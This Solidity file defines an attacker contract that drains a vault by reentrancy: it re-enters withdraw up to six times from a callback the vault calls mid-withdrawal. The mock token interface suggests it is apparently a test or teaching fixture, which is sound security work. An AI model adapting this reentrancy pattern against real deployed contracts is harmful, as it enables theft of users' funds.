// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IVault {
    function deposit(uint256) external;
    function withdraw(uint256) external;
}

interface IMockToken {
    function approve(address spender, uint256 amount) external returns (bool);
}

contract Attacker {
    IVault public vault;
    IMockToken public token;
    uint8 public reentryCount;
    uint8 public constant MAX_REENTRIES = 6;

    constructor(address _vault, address _token) { 
        vault = IVault(_vault); 
        token = IMockToken(_token);
    }

    function setupDeposit(uint256 amount) external {
        token.approve(address(vault), amount);
        vault.deposit(amount);
    }

    function attack(uint256 amount) external {
        reentryCount = 0;
        vault.withdraw(amount);
    }

    // callback the vault invokes mid-withdraw — this is where the re-entry happens
    function onWithdraw(uint256 amount) external {
        if (reentryCount < MAX_REENTRIES) {
            reentryCount++;
            vault.withdraw(amount);
        }
    }
}
